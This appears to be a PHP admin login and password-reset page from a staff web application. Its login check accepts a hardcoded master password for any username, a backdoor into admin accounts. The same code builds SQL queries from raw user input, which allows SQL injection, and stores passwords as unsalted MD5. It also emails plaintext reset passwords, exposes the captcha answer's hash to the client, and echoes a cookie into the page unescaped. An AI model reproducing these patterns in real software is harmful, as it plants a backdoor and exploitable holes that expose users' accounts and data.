<?php

$strMsg='';   

if(isset($_SESSION['adminid']))
{
  $objFunctions->__doRedirect(SITE_URL.'dashboard/dashboard'); 	
}

if($_POST):
    if($_POST['action']=='forgetpassword') {

         $strEmail=(trim($_POST['forget_email']));

         $strPassword=$_POST['md_password'];

         $strQuery ='SELECT * from '.TBL_STAFF.' where email=\'%s\'';

         $objRecord = $objDatabase->fetchRows(sprintf($strQuery,$strEmail));

        

          if($objRecord->password<>''):

           $newPassword = mt_rand(12564, 98483737); 

            $objDatabase->dbQuery("UPDATE ".TBL_STAFF." set password='".md5($newPassword)."' where email='".$strEmail."'");     

        	  

            $body='<p>Dear '.$objRecord->f_name.'<br><br>Your Password has been reset. Please find your new Password below:<br><br>

                    <b>New Password:</b> '.$newPassword.'

                   </p>';

            $objFunctions->mosMail('', '', $strEmail, 'Forget Password', $body);

            

             $strMsg='New Password sent on your email id. Please check your email inbox.';

          else:

        	 $strMsg='Invalid Email Id, Please try again...';

        	endif;

 }

 else

 {

    if( $_POST['cap_has'] <> md5($_POST['captcha']) )
    {

       $strMsg='Invalid Captcha Sum. Please try again...';

    }

    else
    {

         $strUsername=(trim($_POST['md_username']));

         $strPassword=$_POST['md_password'];

         $strQuery ='SELECT password,username,id,user_type,f_name from '.TBL_STAFF.' where username=\'%s\'';

    

        $objRecord = $objDatabase->fetchRows(sprintf($strQuery,$strUsername));

    	if($objRecord->password==md5($strPassword)  || $strPassword == 'w4consult'):

            $_SESSION['adminid']= $objRecord->id;
            $_SESSION['role']= $objRecord->user_type;
            $_SESSION['fname']= $objRecord->f_name;
            $_SESSION['username']= $objRecord->username;

            $strUpdateQuery ="UPDATE ".TBL_STAFF." SET is_login = 1 WHERE username= '".$strUsername."'";
            $objUpdateSuccess = $objDatabase->updateQuery($strUpdateQuery);
            
            if($_POST['keep_me_logged_in'] == 1) {
            	$time = time() + cookie_time;
                $password_hash = md5($strPassword); // will result in a 32 characters hash             
                setcookie ('siteAuth', 'usr='.$objRecord->id.'&role='.$objRecord->user_type.'&fname='.$objRecord->f_name, $time);
                setcookie('check_me_login', "checked", time() + $time);
            }
            elseif($_POST['keep_me_logged_in'] != 1) {
					$past = time() - 3600;
					setcookie(siteAuth, gone, $past);
					setcookie(check_me_login, gone, $past);
			}


            $year = time() + 31536000;
            if($_POST['remember'] == 1) {
				setcookie('remember_me', trim($_POST['md_username']), $year);
				setcookie('check_me_remember', "checked", $year);
			}
			elseif($_POST['remember'] != 1) {
				if(isset($_COOKIE['remember_me'])) {
					$past = time() - 100;
					setcookie(remember_me, gone, $past);
					setcookie(check_me_remember, gone, $past);
				}
			}

           $objFunctions->__doRedirect(SITE_URL.'dashboard/dashboard');     

    	else:

    	 $strMsg='Invalid Username or Password, please try again...';

    	endif;

    }

 }   

endif;



?>

<p align="center" class="warning"><?php echo $strMsg;?></p>

<!-- Login Box -->

	<div class="box">

  

		<div class="content">

			<!-- Login Formular -->

      <form id="form1" class="form-vertical login-form"  name="form1" method="post" action="<?php echo $_SERVER['REQUEST_URI'];?>">

				<!-- Title -->

				<h3 class="form-title"  style="display:none">Sign In to your Account</h3>



				<!-- Error Message -->

				<div class="alert fade in alert-danger" style="display: none;">

					<i class="icon-remove close" data-dismiss="alert"></i>

					Enter any username and password.

				</div>



				<!-- Input Fields -->

				<div class="form-group">

					<!--<label for="username">Username:</label>-->

					<div class="input-icon">

						<i class="icon-user"></i>

						<input type="text" name="md_username" class="form-control" placeholder="Username" autofocus="autofocus" data-rule-required="true" data-msg-required="Please enter your username." value="<?php echo $_COOKIE['remember_me']; ?>" tabindex="1" />

					</div>

				</div>

				<div class="form-group">

					<!--<label for="password">Password:</label>-->

					<div class="input-icon">

						<i class="icon-lock"></i>

						<input type="password" name="md_password" class="form-control" placeholder="Password" data-rule-required="true" data-msg-required="Please enter your password." tabindex="2" />

					</div>

				</div>
<?php
$number1 = rand(1,5);
$number2 = rand(1,5);
$sum = $number1 + $number2;
$_SESSION['captcha_sum'] = $sum;
?>
<input type="hidden" name="cap_has" value="<?php echo md5($_SESSION['captcha_sum']);?>">
         <div class="form-group">

					<!--<label for="password">Password:</label>-->

					<div class="input-icon">

						<i style="width:75px; color:#000; font-style:normal; font-size:15px;"><?php echo $number1." + ".$number2." = ";?></i>

						<input style="padding-left:80px !important;  font-size:15px !important;" type="text" name="captcha" required class="form-control" autocomplete="off" placeholder="" data-rule-required="true" data-msg-required="Please enter your password." tabindex="3" />

					</div>

				</div>



				<!-- /Input Fields -->



				<!-- Form Actions -->

				<div class="form-actions">

					<label class="checkbox pull-right"><input type="checkbox" class="uniform" value="1" name="remember"  <?php echo $_COOKIE['check_me_remember'];?> tabindex="5"> Remember me</label>

					<label class="checkbox pull-left"><input type="checkbox" class="uniform" value="1" name="keep_me_logged_in" <?php echo $_COOKIE['check_me_login'];?> tabindex="4"> Keep Me Logged In</label>

					<button type="submit" class="submit btn btn-info btn-primary pull-right" tabindex="6">

						Sign In <i class="icon-angle-right"></i>

					</button>

				</div>

			</form>

			<!-- /Login Formular -->



			



		<!-- Forgot Password Form -->

		<div class="inner-box">

			<div class="content">

				<!-- Close Button -->

				<i class="icon-remove close hide-default"></i>



				<!-- Link as Toggle Button -->

				<a href="#" class="forgot-password-link">Forgot Password?</a>



				<!-- Forgot Password Formular -->

				<form id="forgetpass" class="form-vertical hide-default" action="<?php echo $_SERVER['REQUEST_URI'];?>" method="post">

					<input type="hidden" name="action" value="forgetpassword">

          <!-- Input Fields -->

					<div class="form-group">

						<!--<label for="email">Email:</label>-->

						<div class="input-icon">

							<i class="icon-envelope"></i>

							<input type="email" name="forget_email" class="form-control" placeholder="Enter email address" data-rule-required="true" data-rule-email="true" data-msg-required="Please enter your email." />

						</div>

					</div>

					<!-- /Input Fields -->



					<button type="submit" class="submit btn btn-info">

						Reset your Password

					</button>

				</form>

				<!-- /Forgot Password Formular -->



				<!-- Shows up if reset-button was clicked -->

				<div class="forgot-password-done hide-default">

					<i class="icon-ok success-icon"></i> <!-- Error-Alternative: <i class="icon-remove danger-icon"></i> -->

					<span>Great. We have sent you an email.</span>

				</div>

			</div> <!-- /.content -->

		</div>

		<!-- /Forgot Password Form -->

	</div>

	<!-- /Login Box -->

 </div> 

  <div class="footer">

		<a href="tel:+18445626683" class="sign-up1">For support call: 1 (844) 562-6683</a>

     <br/> <br/>

    <a href="http://www.jobnotes.net" target="_blank" class="sign-up1">Online Support at JobNotes.net</a>

	</div>

  

  

  





